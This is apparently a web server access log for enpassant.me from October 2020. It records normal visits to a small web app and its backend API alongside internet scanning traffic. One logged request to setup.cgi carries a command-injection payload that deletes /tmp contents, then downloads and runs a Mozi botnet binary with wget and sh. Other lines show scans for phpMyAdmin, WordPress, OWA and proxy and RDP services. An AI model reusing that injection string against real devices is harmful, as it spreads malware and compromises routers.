212.253.45.119 - - [12/Oct/2020:23:01:52 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:04:19 +0000] "GET /linuxornot/static HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:04:19 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/static" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:04:19 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/static" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:04:19 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/static" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:04:19 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/static" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
109.94.113.171 - - [12/Oct/2020:23:05:19 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:40 +0000] "GET /linuxornot HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:46 +0000] "GET /linuxornot/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:46 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 304 0 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:46 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 304 0 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:46 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 304 0 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:07:46 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 304 0 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:08:01 +0000] "GET /linuxornot/ HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:08:01 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:08:01 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:08:01 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:08:01 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:26 +0000] "GET /linuxornot/ HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:26 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:26 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:26 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:26 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:30 +0000] "GET /linuxornot/ HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:31 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:31 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:31 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:31 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:33 +0000] "GET /linuxornot HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:33 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:33 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:33 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:09:33 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
91.135.106.75 - - [12/Oct/2020:23:10:11 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:12:37 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:48 +0000] "GET /linuxornot HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:48 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 304 0 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:48 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 304 0 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:48 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 304 0 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:48 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 304 0 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:14:51 +0000] "GET /linuxornot/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:16:43 +0000] "GET /linuxornot/static HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
213.202.223.223 - - [12/Oct/2020:23:30:23 +0000] "POST /goform/webLogin HTTP/1.1" 404 134 "http://159.89.17.0:80/login_inter.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
213.202.223.223 - - [12/Oct/2020:23:30:23 +0000] "" 400 0 "-" "-"
212.253.45.119 - - [12/Oct/2020:23:35:12 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:12 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:21 +0000] "GET /linuxornot HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:26 +0000] "GET /linuxornot/ HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:26 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:26 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:26 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:35:26 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:39:09 +0000] "GET /linuxornot HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:39:14 +0000] "GET /linuxornot/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:39:14 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 304 0 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:39:14 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 304 0 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
212.253.45.119 - - [12/Oct/2020:23:39:14 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 304 0 "http://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.188.210.227 - - [12/Oct/2020:23:39:22 +0000] "\x05\x01\x00" 400 166 "-" "-"
5.188.210.227 - - [12/Oct/2020:23:40:36 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"
5.188.210.227 - - [12/Oct/2020:23:41:16 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 666 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
83.97.20.189 - - [13/Oct/2020:00:19:33 +0000] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 166 "-" "-"
27.224.136.207 - - [13/Oct/2020:00:38:09 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
171.34.177.9 - - [13/Oct/2020:00:38:10 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
180.95.231.19 - - [13/Oct/2020:00:38:11 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
171.34.176.205 - - [13/Oct/2020:00:38:23 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"
91.234.62.21 - - [13/Oct/2020:00:50:47 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
209.126.3.185 - - [13/Oct/2020:01:20:16 +0000] "GET / HTTP/1.1" 200 612 "-" "libwww-perl/6.49"
209.126.3.185 - - [13/Oct/2020:01:20:53 +0000] "GET / HTTP/1.1" 200 612 "-" "libwww-perl/6.49"
192.241.216.130 - - [13/Oct/2020:01:46:04 +0000] "GET /portal/redlion HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
138.68.249.116 - - [13/Oct/2020:02:06:37 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"
34.125.89.31 - - [13/Oct/2020:02:07:14 +0000] "GET /wp/wp-login.php HTTP/1.1" 404 134 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
5.188.210.227 - - [13/Oct/2020:02:47:33 +0000] "\x05\x01\x00" 400 166 "-" "-"
5.188.210.227 - - [13/Oct/2020:02:48:30 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"
5.188.210.227 - - [13/Oct/2020:02:49:11 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 197 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
52.34.67.182 - - [13/Oct/2020:03:18:07 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.149.171.23 - - [13/Oct/2020:03:18:33 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Go-http-client/1.1"
54.149.171.23 - - [13/Oct/2020:03:18:34 +0000] "GET / HTTP/1.1" 200 396 "-" "Go-http-client/1.1"
102.165.30.1 - - [13/Oct/2020:04:17:00 +0000] "GET / HTTP/1.1" 200 612 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
184.105.247.194 - - [13/Oct/2020:04:41:43 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
167.248.133.35 - - [13/Oct/2020:05:01:17 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
167.248.133.35 - - [13/Oct/2020:05:01:17 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.132.53.161 - - [13/Oct/2020:06:08:49 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
62.4.14.206 - - [13/Oct/2020:06:58:38 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
185.202.2.68 - - [13/Oct/2020:07:08:55 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
71.6.232.9 - - [13/Oct/2020:07:29:49 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
62.4.14.206 - - [13/Oct/2020:07:38:59 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
190.154.90.193 - - [13/Oct/2020:07:45:27 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0"
51.15.191.81 - - [13/Oct/2020:07:49:43 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
185.132.53.161 - - [13/Oct/2020:07:50:48 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
212.253.48.86 - - [13/Oct/2020:07:53:16 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.83.146.233 - - [13/Oct/2020:07:56:36 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
212.253.48.86 - - [13/Oct/2020:08:32:38 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 200 45054 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:08:32:52 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 499 0 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:08:33:29 +0000] "GET / HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"
212.253.48.86 - - [13/Oct/2020:08:33:30 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"
212.253.48.86 - - [13/Oct/2020:08:33:36 +0000] "GET / HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"
212.253.48.86 - - [13/Oct/2020:08:38:28 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38"
212.253.48.86 - - [13/Oct/2020:09:18:07 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:18:07 +0000] "GET /favicon.ico HTTP/1.1" 200 200 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:18:14 +0000] "GET /test HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:18:19 +0000] "GET /test12312312 HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:18:26 +0000] "GET /12312 HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:18:52 +0000] "GET /backend/ HTTP/1.1" 200 3 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:45:28 +0000] "GET /test HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:09:45:28 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "http://enpassant.me/test" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
176.55.110.117 - - [13/Oct/2020:09:59:47 +0000] "GET / HTTP/1.1" 200 200 "-" "WhatsApp/2.20.102 i"
192.241.237.74 - - [13/Oct/2020:10:01:36 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 200 200 "-" "Mozilla/5.0 zgrab/0.x"
85.153.207.202 - - [13/Oct/2020:10:02:56 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 200 45054 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:03:13 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 304 0 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:03:29 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 304 0 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:03:46 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 304 0 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:04:03 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 304 0 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.48.86 - - [13/Oct/2020:10:04:33 +0000] "GET /backend/games/76561198039880907 HTTP/1.1" 200 45054 "https://dyslexicat.github.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:06:53 +0000] "GET / HTTP/1.1" 200 200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.153.207.202 - - [13/Oct/2020:10:06:53 +0000] "GET /favicon.ico HTTP/1.1" 200 200 "https://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
